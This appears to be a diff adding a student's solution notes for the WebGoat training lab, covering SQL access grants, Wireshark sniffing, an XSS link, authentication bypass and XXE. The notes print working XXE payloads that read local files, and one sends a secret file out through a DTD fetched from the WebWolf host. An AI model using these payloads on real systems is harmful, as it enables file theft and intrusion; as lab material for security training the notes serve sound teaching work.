@@ -1,0 +1,122 @@
+Docker pull and run commands
+
+docker pull webgoat/goatandwolf
+docker run -p 127.0.0.1:8080:8080 -p 127.0.0.1:9090:9090 -e TZ=Europe/Amsterdam webgoat/goatandwolf
+WebGoat will be located at: http://127.0.0.1:8080/WebGoat
+
+
+webwolf login:
+https://127.0.0.1:5678/login
+sign in:
+Username:    username@webgoat.org
+Password:    webgoat password  
+
+-----------------------------------------------------------------------------------------------
+Link:
+1) bit.ly/ecwebgoat 
+2) bit.ly/ecgdb
+3) https://github.com/WebGoat/WebGoat/wiki/(Almost)-Fully-Documented-Solution-(en)#sql-injection-mitigation
+4) https://docs.cycubix.com/web-application-security-essentials/solutions/a2-broken-authentication/jwt-tokens-5
+5) https://hub.docker.com/r/webgoat/goatandwolf
+-------------------------------------------------------------------------------------------------
+A1-1-5
+GRANT SELECT ON grant_rights TO unauthorized_user
+
+
+A1-2-5
+tom
+thisisasecretfortomonly
+
+
+-------------------------------------------------------------------------------------
+A1- Mitigation -12:
+
+
+
+A3-
+1) open wireshark
+2) click login on without values
+3) click on the adapter for loop back 
+4) stop all the services
+5) type http.request.method=="POST"
+
+6) click on line based text data
+-------------------------------------------------------------------------
+A7-
+11) Link for test :
+http://127.0.0.1:8080/WebGoat/start.mvc#test/%3Cscript%3Ewebgoat.customjs.phoneHome()
+
+Click on test in the above link
+go to inspect 
+got to console
+then  copy the number with the symbols and paste it .
+
+-----------------------------------------------------
+
+A4:
+1) Open owasp and redirect to mozarila firefox in owasp
+
+2) open http://127.0.0.1:8080/WebGoat
+3) type user name and password
+4) open a4 and simply type hi
+5) open owasp click on history
+6)find the post request at the correct timestamp
+7)right click on it and click open or resent with request editor
+6) copy paste the code in the request editor :
+            <?xml version="1.0"?>
+		<!DOCTYPE cat [
+		<!ENTITY root SYSTEM "file:///">
+							]>
+		<comment> <text>&root;</text></comment>
+7) save 
+8) go the the morzilla firefox and check.
+
+-------------------------------------------------------
+
+A4-7:
+1) send hi in the 4th question 
+2) go to owasp
+3) click on the post request at the correct timestamp
+4) right click and click on thw request editor 
+5) copy paste the above code in the 6
+6) change the content type json to xml
+
+------------------------------------------------------
+
+A4-11:
+1) send hi in the 4th question 
+2) go to owasp
+3) click on the post request at the correct timestamp
+4) right click and click on thw request editor 
+5)	<?xml version="1.0" encoding="UTF-8"?>
+	<!DOCTYPE xxe [
+	<!ENTITY % file SYSTEM "file:///home/webgoat/.webgoat-v8.0.0-SNAPSHOT//XXE/secret.txt" >
+	<!ENTITY % dtd SYSTEM "http://0.0.0.0:9090/files/username/attack.dtd"  >
+	%dtd;]>
+	<comment>
+	<text>test&send;</text>
+	</comment>]
+6) sign in to webwolf
+7) go to files
+8) browse files and upload attack.dtd files
+9) go to owasp and click send in request editor 
+10) go to webwolf go to incoming request and direct to landing slash and open it.
+11) go to the series of 20 percentage lines copy the line  
+12) where and all there is %20 delete it leave it an space.
+
+
+--------------------------------------------------------------------
+ A2 - 1 (Authentication bypass)
+
+1) go to inspect and click on  console 
+2) click on empty field submit
+3) click on the post request right click and click on edit 
+4) on the below line secQuestion0=&secQuestion1=&jsEnabled=1&verifyMethod=SEC_QUESTIONS&userId=12309746
+5) change  secQuestion2 and secQuestion3
+
+
+
+
+
+
+
